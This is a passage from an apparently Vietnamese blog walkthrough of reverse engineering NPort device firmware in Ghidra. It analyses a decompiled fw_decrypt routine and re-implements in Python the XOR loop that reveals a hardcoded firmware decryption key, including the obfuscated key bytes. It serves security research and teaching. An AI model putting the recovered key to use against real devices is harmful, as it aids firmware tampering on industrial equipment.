</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> ((((<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x29</span>) <span style="color:#56b6c2">||</span> (<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span>)) <span style="color:#56b6c2">||</span>
</span></span><span style="display:flex;"><span>        (<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>))) <span style="color:#56b6c2">||</span> ((<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&amp;</span> <span style="color:#d19a66">0xf</span>) <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_24</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uStack_20</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_3</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>((<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (((<span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>) <span style="color:#56b6c2">&amp;&amp;</span> ((<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>)) <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         (<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xe</span>) <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">__src</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_24</span>,<span style="color:#e06c75">__src</span>,<span style="color:#d19a66">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)<span style="color:#61afef;font-weight:bold">cal_crc32</span>((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">__src</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>,<span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">+</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>,
</span></span><span style="display:flex;"><span>                                   <span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">local_24</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> ((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">uVar4</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffb</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_0001191c</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#e06c75">LAB_0001191c</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#61afef;font-weight:bold">CONCAT44</span>(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">uVar1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ở dòng này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>((<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span></code></pre></div><p>Bởi vì mình biết cách hàm <code>ecb128Decrypt</code> hoạt động, mình có thể thấy là tham số <code>decrypt_in</code> và <code>decrypt_out</code> có cùng 1 biến: <code>param_1</code>. Điều này có nghĩa là biến <code>param_1</code> được giải mã vào chính nó. Mình sẽ đặt tên <code>param_1</code> thành <code>fw_buffer</code> và đặt lại kiểu dữ liệu thành <code>uchar*</code>.</p>
<p>Hàm <code>ecb128Decrypt</code> cũng lấy 1 tham số gọi là <code>decrypt_size</code>, tham số này có dữ liệu từ <code>param_2</code> (ở dòng <code>decrypt_size = *param_2;</code>). Mình sẽ đặt tên của <code>param_2</code> thành <code>fw_buffer_size</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>(<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span></code></pre></div><p>Ở dòng điều kiện &ldquo;<em>if</em>&rdquo;, nó sẽ check xem <code>param_1</code> (<code>fw_buffer</code>) có giá trị <em>null</em> hay không. Nếu nó có giá trị là <em>null</em> thì biến <code>uVar2</code> sẽ được gán giá trị <em>0xffffffff</em>. Biến <code>uVar2</code> là biến đầu ra của hàm <code>fw_decrypt</code> thế nên mình sẽ đặt tên nó thành <code>return_value</code>.</p>
<p>Đặt <code>return_value</code> thành <em>0xffffffff</em> sẽ overflow biến này <code>return_value</code> thành 1 giá trị âm. Mình có thể check xem số này là số nào bằng cách đổi kiểu dữ liệu của <code>return_value</code> từ <code>uint</code> sang <code>int</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">==</span> (<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#d19a66">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">return_value</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nó sẽ đặt <code>return_value</code> thành <em>-1</em>, có nghĩa là fail trong C. Mình có thể suy ra kiểu dữ liệu của hàm <code>fw_decrypt</code> từ biến <code>uVar2</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">fw_decrypt</span>(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">fw_buffer_size</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_3</span>)
</span></span></code></pre></div><p>Hàm này đã trở nên dễ đọc hơn nhiều</p>
<p>Ở trong câu lệnh <em>if</em> ở trong câu lệnh <em>else if</em>, nó sẽ check lỗi và kích cỡ hàm không hợp lệ và trả về giá trị âm nếu không hợp lệ. Câu lệnh <em>else</em> sau đó nhìn nhìn khá thú vị, mình sẽ xem nó làm những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_24</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fw_buffer_size</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uStack_20</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>(<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">fw_buffer</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (((<span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>) <span style="color:#56b6c2">&amp;&amp;</span> (<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fw_buffer</span>[<span style="color:#d19a66">0xd</span>], (<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>)) <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>     (<span style="color:#e06c75">fw_buffer</span>[<span style="color:#d19a66">0xe</span>] <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_24</span>,<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span>,<span style="color:#d19a66">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)<span style="color:#61afef;font-weight:bold">cal_crc32</span>((<span style="color:#e5c07b">int</span>)(<span style="color:#e06c75">fw_buffer</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#e06c75">bVar1</span> <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>),
</span></span><span style="display:flex;"><span>                               <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">fw_buffer</span>[<span style="color:#d19a66">0xd</span>] <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">local_24</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> ((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">&lt;=</span> (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">decrypt_size</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">*</span><span style="color:#e06c75">fw_buffer_size</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">return</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">return_value</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mình sẽ đi qua từng đoạn và phân tích nó:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span></code></pre></div><p><code>passwd.3309</code> nhìn giống như 1 biến chứa mật khẩu. Biến này cũng được dùng cho tham số <code>decrypt_key</code> của hàm <code>ecb128Decrypt</code>. Biến <code>pbVar3</code> sẽ giữ giá trị của <code>passwd.3309</code> thế nên mình sẽ đặt tên <code>pbVar3</code> thành <code>password</code>.</p>
<p>Tiếp theo là vòng lặp <em>while</em>, biến <code>password</code> sẽ được biến đổi qua 1 vài thao tác <em>XOR</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đây có thể là 1 phương thức &ldquo;làm mờ&rdquo; hoặc mã hóa. Mình sẽ thử mô phỏng vòng lặp này bằng cách viết lại vòng lặp này trong Python.</p>
<p>Đầu tiên thì mình sẽ cần lấy dữ liệu mà <code>passwd.3309</code> đang trỏ đến, mình có thể làm thế bằng cách nhìn trong cửa số <strong>Bytes</strong> của Ghidra:</p>

    <img src="/img/nport-firmware/nport-firmware-fw_decrypt-passwd-bytes.png"  alt="NPort firmware fw_decrypt passwd3309 byte"  class="center"  style="padding: 10px"  />


<p>Mình sẽ copy các byte được bôi đen vào 1 mảng trong Python:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">passwd</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0x95</span>, <span style="color:#d19a66">0xb3</span>, <span style="color:#d19a66">0x15</span>, <span style="color:#d19a66">0x32</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0x43</span>, <span style="color:#d19a66">0x6b</span>, <span style="color:#d19a66">0x90</span>, <span style="color:#d19a66">0xbe</span>, <span style="color:#d19a66">0x1b</span>, <span style="color:#d19a66">0x31</span>, <span style="color:#d19a66">0xa7</span>, <span style="color:#d19a66">0x8b</span>, <span style="color:#d19a66">0x2d</span>, <span style="color:#d19a66">0x05</span>]
</span></span></code></pre></div><p>Mình sẽ làm lại vòng lặp <em>while</em> với các thao tác <em>XOR</em> như trong chương trình dịch ngược:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">passwd</span>)):
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0xa7</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x8b</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x2d</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">5</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+=</span> <span style="color:#d19a66">4</span>
</span></span></code></pre></div><p>Sau đó mình có thể in ra mật khẩu:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">join</span>(<span style="color:#e5c07b">chr</span>(<span style="color:#e06c75">byte</span>) <span style="color:#c678dd">for</span> <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">passwd</span>))
</span></span></code></pre></div><p>Đây là chương trình Python full:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">passwd</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0x95</span>, <span style="color:#d19a66">0xb3</span>, <span style="color:#d19a66">0x15</span>, <span style="color:#d19a66">0x32</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0xe4</span>, <span style="color:#d19a66">0x43</span>, <span style="color:#d19a66">0x6b</span>, <span style="color:#d19a66">0x90</span>, <span style="color:#d19a66">0xbe</span>, <span style="color:#d19a66">0x1b</span>, <span style="color:#d19a66">0x31</span>, <span style="color:#d19a66">0xa7</span>, <span style="color:#d19a66">0x8b</span>, <span style="color:#d19a66">0x2d</span>, <span style="color:#d19a66">0x05</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">passwd</span>)):
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0xa7</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x8b</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">0x2d</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">passwd</span>[<span style="color:#e06c75">i</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^=</span> <span style="color:#d19a66">5</span>
